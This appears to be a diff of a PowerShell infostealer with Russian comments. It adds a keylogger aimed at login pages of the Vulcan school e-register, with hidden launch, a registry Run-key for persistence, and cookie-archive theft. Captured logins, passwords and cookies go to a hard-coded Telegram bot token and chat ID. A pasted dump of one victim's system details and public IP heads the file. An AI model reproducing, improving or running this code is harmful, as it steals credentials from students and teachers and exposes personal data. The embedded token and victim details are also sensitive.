@@ -1,3 +1,42 @@
+stealer:
+=== SYSTEM INFORMATION ===
+User: who`s
+Computer: DESKTOP-MGOORP9
+Domain: DESKTOP-MGOORP9
+
+=== HARDWARE INFORMATION ===
+Processor: Intel(R) Core(TM) i7-4870HQ CPU @ 2.50GHz
+RAM: 16 GB
+GPU: NVIDIA GeForce GT 750M
+Disk C: Free: 96.59 GB / Total: 139.76 GB
+
+=== OPERATING SYSTEM ===
+OS: Майкрософт Windows 10 Pro
+Version: 10.0.19045
+Build: 19045
+
+=== NETWORK INFORMATION ===
+Public IP: 93.159.49.96
+
+Network Interfaces:
+- Local Area Connection* 10 : 169.254.238.90
+- Local Area Connection* 9 : 169.254.16.149
+- Bluetooth Network : 169.254.241.191
+- Wireless Network : 192.168.100.16
+
+
+Active Connections:
+- 192.168.100.16:50833 -> 34.117.59.81:80
+- 192.168.100.16:50832 -> 185.199.110.133:443
+- 192.168.100.16:50821 -> 150.171.28.11:443
+- 192.168.100.16:50820 -> 13.107.246.44:443
+- 192.168.100.16:50819 -> 150.171.28.11:443
+
+
+=== WIFI PASSWORDS ===
+No WiFi networks
+
+=== KEYLOGGER STATUS ===
 # Основной сбор данных
 $sys = Get-CimInstance Win32_ComputerSystem
 $os = Get-CimInstance Win32_OperatingSystem
@@ -20,254 +59,198 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# УПРОЩЕННЫЙ ИСПРАВЛЕННЫЙ КЕЙЛОГГЕР
+# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
+$keyloggerStatus = "Starting..."
+
+# Создаем улучшенный кейлоггер
 $keyloggerScript = @"
-`$ErrorActionPreference = 'SilentlyContinue'
-
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
 
-# Функция отправки в Telegram
-function Send-TelegramMessage {
+# Список целевых сайтов Вулкан
+`$vulcanUrls = @(
+    "*vulcan*",
+    "*uonetplus*", 
+    "*dziennik*",
+    "*edu.gdynia*",
+    "*eszkola.opolskie.pl*",
+    "*cufs.vulcan.net.pl*",
+    "*dziennik-logowanie.vulcan.net.pl*",
+    "*Account/LogOn*"
+)
+
+`$capturedData = @()
+`$currentWindow = ""
+`$buffer = ""
+`$isVulcanSite = `$false
+`$loginField = `$false
+`$passwordField = `$false
+`$loginData = ""
+`$passwordData = ""
+
+function Send-ToTelegram {
     param(`$message)
     try {
         `$body = @{
             chat_id = '5674514050'
             text = `$message
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
     } catch { }
 }
 
-# Функция получения активного окна
-function Get-ActiveWindowTitle {
-    try {
-        Add-Type @"
-        using System;
-        using System.Runtime.InteropServices;
-        using System.Text;
-        
-        public class WindowHelper {
-            [DllImport("user32.dll")]
-            public static extern IntPtr GetForegroundWindow();
+function Process-Buffer {
+    if(`$buffer -ne "") {
+        # Определяем тип данных по контексту
+        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
+            `$loginData = `$buffer
+            Send-ToTelegram "🔑 VULCAN LOGIN: `$loginData"
+        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
+            `$passwordData = `$buffer
+            Send-ToTelegram "🔒 VULCAN PASSWORD: `$passwordData"
             
-            [DllImport("user32.dll")]
-            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+            # Если есть и логин и пароль - отправляем вместе
+            if(`$loginData -ne "" -and `$passwordData -ne "") {
+                Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$loginData`nPassword: `$passwordData"
+                `$loginData = ""
+                `$passwordData = ""
+            }
+        } else {
+            # Отправляем обычные данные
+            Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
         }
-"@ -ErrorAction SilentlyContinue
         
-        `$buffer = New-Object System.Text.StringBuilder(256)
-        `$handle = [WindowHelper]::GetForegroundWindow()
-        `$length = [WindowHelper]::GetWindowText(`$handle, `$buffer, `$buffer.Capacity)
-        
-        if (`$length -gt 0) {
-            return `$buffer.ToString()
-        }
-    } catch { }
-    
-    return ""
-}
-
-# Функция проверки сайтов Vulcan
-function Test-VulcanSite {
-    param(`$windowTitle)
-    
-    if ([string]::IsNullOrEmpty(`$windowTitle)) { return `$false }
-    
-    `$vulcanKeywords = @(
-        "vulcan", "uonet", "dziennik", "edu.gdynia", "eszkola", 
-        "logowanie", "login", "account", "uczen", "nauczyciel",
-        "cufs", "uonetplus", "dziennik elektroniczny"
-    )
-    
-    foreach (`$keyword in `$vulcanKeywords) {
-        if (`$windowTitle.ToLower().Contains(`$keyword.ToLower())) {
-            return `$true
-        }
+        `$capturedData += `$buffer
+        `$buffer = ""
     }
-    
-    return `$false
 }
 
-# Основной цикл кейлоггера
-`$buffer = ""
-`$lastWindow = ""
-`$lastSendTime = Get-Date
-`$isMonitoring = `$false
-
-Send-TelegramMessage "VULCAN KEYLOGGER STARTED - Monitoring system initialized"
-
-while (`$true) {
+while(`$true) {
     try {
         # Получаем активное окно
-        `$currentWindow = Get-ActiveWindowTitle
-        `$isVulcanSite = Test-VulcanSite -windowTitle `$currentWindow
+        `$activeWindow = ""
+        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
+        if(`$processes) {
+            `$activeWindow = `$processes[0].MainWindowTitle
+        }
         
-        if (`$isVulcanSite) {
-            if (-not `$isMonitoring -or `$currentWindow -ne `$lastWindow) {
-                `$isMonitoring = `$true
-                `$lastWindow = `$currentWindow
-                Send-TelegramMessage "VULCAN SITE DETECTED: `$currentWindow"
+        # Проверяем активное окно на наличие сайтов Вулкан
+        `$siteDetected = `$false
+        foreach(`$url in `$vulcanUrls) {
+            if(`$activeWindow -like `$url) {
+                `$siteDetected = `$true
+                break
             }
-            
-            # Проверяем нажатия клавиш
-            for (`$i = 8; `$i -le 254; `$i++) {
+        }
+        
+        if(`$siteDetected) {
+            if(!`$isVulcanSite) {
+                `$isVulcanSite = `$true
+                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`n`$activeWindow"
+            }
+        } else {
+            if(`$isVulcanSite) {
+                `$isVulcanSite = `$false
+                Process-Buffer
+                Send-ToTelegram "📱 USER LEFT VULCAN SITE"
+            }
+        }
+        
+        # Перехватываем нажатия клавиш только на сайтах Вулкан
+        if(`$isVulcanSite) {
+            for(`$i = 8; `$i -lt 255; `$i++) {
                 `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-                
-                if (`$keyState -eq -32767) {
+                if(`$keyState -eq -32767) {
                     `$key = [System.Windows.Forms.Keys]`$i
                     
-                    # Обработка специальных клавиш
-                    switch (`$key) {
+                    # Обрабатываем специальные клавиши
+                    switch(`$key) {
                         "Enter" { 
-                            if (`$buffer.Length -gt 0) {
-                                Send-TelegramMessage "VULCAN INPUT [ENTER]: `$buffer"
-                                `$buffer = ""
-                            }
+                            Process-Buffer
                         }
                         "Space" { 
                             `$buffer += " " 
                         }
                         "Back" { 
-                            if (`$buffer.Length -gt 0) { 
+                            if(`$buffer.Length -gt 0) { 
                                 `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                             }
                         }
                         "Tab" { 
                             `$buffer += "[TAB]"
-                            if (`$buffer.Length -gt 0) {
-                                Send-TelegramMessage "VULCAN INPUT [TAB]: `$buffer"
-                                `$buffer = ""
-                            }
+                            Process-Buffer
                         }
                         "LButton" { 
-                            # Левый клик - отправляем буфер
-                            if (`$buffer.Length -gt 0) {
-                                Send-TelegramMessage "VULCAN INPUT [CLICK]: `$buffer"
-                                `$buffer = ""
-                            }
+                            # Клик мыши - обрабатываем буфер
+                            Process-Buffer
                         }
                         "RButton" { 
-                            # Правый клик - отправляем буфер
-                            if (`$buffer.Length -gt 0) {
-                                Send-TelegramMessage "VULCAN INPUT [RCLICK]: `$buffer"
-                                `$buffer = ""
-                            }
+                            # Правый клик - обрабатываем буфер
+                            Process-Buffer
                         }
-                        "LShiftKey" { }
-                        "RShiftKey" { }
-                        "ShiftKey" { }
-                        "ControlKey" { }
-                        "LControlKey" { }
-                        "RControlKey" { }
-                        "LMenu" { }
-                        "RMenu" { }
-                        "Capital" { }
-                        "NumLock" { }
-                        "Scroll" { }
                         default {
-                            # Обработка обычных символов
-                            `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
-                            `$isCapsLock = [System.Console]::CapsLock
-                            
-                            # Буквы A-Z
-                            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
-                                if ((`$isShift -and -not `$isCapsLock) -or (-not `$isShift -and `$isCapsLock)) {
+                            # Обрабатываем обычные символы
+                            if(`$key -ge 65 -and `$key -le 90) {
+                                # Буквы A-Z
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
+                                
+                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                     `$buffer += `$key.ToString()
                                 } else {
                                     `$buffer += `$key.ToString().ToLower()
                                 }
-                            }
-                            # Цифры 0-9
-                            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
+                            } elseif(`$key -ge 48 -and `$key -le 57) {
+                                # Цифры 0-9
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                 `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                                if (`$isShift) {
-                                    `$buffer += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
+                                if(`$isShift) {
+                                    `$buffer += `$symbols[`$key - 48]
                                 } else {
-                                    `$buffer += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
+                                    `$buffer += (`$key - 48).ToString()
                                 }
-                            }
-                            # Специальные символы
-                            else {
-                                switch (`$key) {
-                                    "OemPeriod" { `$buffer += "." }
-                                    "Oemcomma" { `$buffer += "," }
-                                    "OemQuestion" { `$buffer += if (`$isShift) { "?" } else { "/" } }
-                                    "Oemtilde" { `$buffer += if (`$isShift) { "~" } else { "`" } }
-                                    "OemOpenBrackets" { `$buffer += if (`$isShift) { "{" } else { "[" } }
-                                    "OemCloseBrackets" { `$buffer += if (`$isShift) { "}" } else { "]" } }
-                                    "OemPipe" { `$buffer += if (`$isShift) { "|" } else { "\" } }
-                                    "OemMinus" { `$buffer += if (`$isShift) { "_" } else { "-" } }
-                                    "Oemplus" { `$buffer += if (`$isShift) { "+" } else { "=" } }
-                                    "OemSemicolon" { `$buffer += if (`$isShift) { ":" } else { ";" } }
-                                    "OemQuotes" { `$buffer += if (`$isShift) { "`"" } else { "'" } }
-                                    "Decimal" { `$buffer += "." }
-                                    "Divide" { `$buffer += "/" }
-                                    "Multiply" { `$buffer += "*" }
-                                    "Subtract" { `$buffer += "-" }
-                                    "Add" { `$buffer += "+" }
+                            } elseif(`$key -eq 190 -or `$key -eq 110) {
+                                # Точка
+                                `$buffer += "."
+                            } elseif(`$key -eq 189 -or `$key -eq 109) {
+                                # Минус/дефис
+                                `$buffer += "-"
+                            } elseif(`$key -eq 187 -or `$key -eq 107) {
+                                # Плюс/равно
+                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                                if(`$isShift) {
+                                    `$buffer += "+"
+                                } else {
+                                    `$buffer += "="
                                 }
                             }
                         }
                     }
                     
-                    # Автоматическая отправка при длинном вводе
-                    if (`$buffer.Length -ge 30) {
-                        Send-TelegramMessage "VULCAN INPUT [AUTO]: `$buffer"
-                        `$buffer = ""
-                        `$lastSendTime = Get-Date
+                    # Автоматически отправляем длинные вводы
+                    if(`$buffer.Length -gt 50) {
+                        Process-Buffer
                     }
                 }
             }
-        } else {
-            # Если ушли с сайта Vulcan - отправляем оставшиеся данные
-            if (`$isMonitoring -and `$buffer.Length -gt 0) {
-                Send-TelegramMessage "VULCAN INPUT [LEAVE]: `$buffer"
-                `$buffer = ""
-            }
-            `$isMonitoring = `$false
         }
-        
-        # Автоматическая отправка каждые 15 секунд
-        if ((Get-Date) - `$lastSendTime -gt [TimeSpan]::FromSeconds(15)) {
-            if (`$buffer.Length -gt 0) {
-                Send-TelegramMessage "VULCAN INPUT [TIMEOUT]: `$buffer"
-                `$buffer = ""
-            }
-            `$lastSendTime = Get-Date
-        }
-        
-    } catch {
-        # Игнорируем ошибки для непрерывной работы
-    }
-    
-    Start-Sleep -Milliseconds 10
+    } catch { }
+    Start-Sleep -Milliseconds 5
 }
 "@
 
-# Сохраняем и запускаем исправленный кейлоггер
+# Сохраняем и запускаем улучшенный кейлоггер
 try {
-    $keyloggerPath = "$env:TEMP\vulcan_monitor.ps1"
-    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
-    
-    # Запускаем в отдельном процессе
-    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
+    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger.ps1" -Encoding ASCII
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`"" -WindowStyle Hidden
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
-    Set-ItemProperty -Path $startupPath -Name "WindowsMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
+    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
+    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "KEYLOGGER ACTIVE - Monitoring Vulcan sites (PowerShell version)"
-    
-    # Тестовая отправка
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
-        chat_id = '5674514050'
-        text = "SYSTEM SCAN COMPLETED - Keylogger initialized and monitoring Vulcan sites"
-    }
-    
+    $keyloggerStatus = "✅ Advanced keylogger active - monitoring Vulcan sites"
 } catch {
-    $keyloggerStatus = "Keylogger setup failed: $($_.Exception.Message)"
+    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
 }
 
 # Безопасность
@@ -384,7 +367,7 @@ if (Test-Path $zipPath) {
         Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
             chat_id = '5674514050'
             document = [System.IO.File]::OpenRead($zipPath)
-            caption = "COOKIES ARCHIVE - Download and extract to view cookies files"
+            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
         }
     } catch {
         # Если не удалось отправить ZIP, отправляем файлы по отдельности
@@ -412,6 +395,5 @@ if (Test-Path $zipPath) {
 }
 
 # Очистка
-Start-Sleep 2
 Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
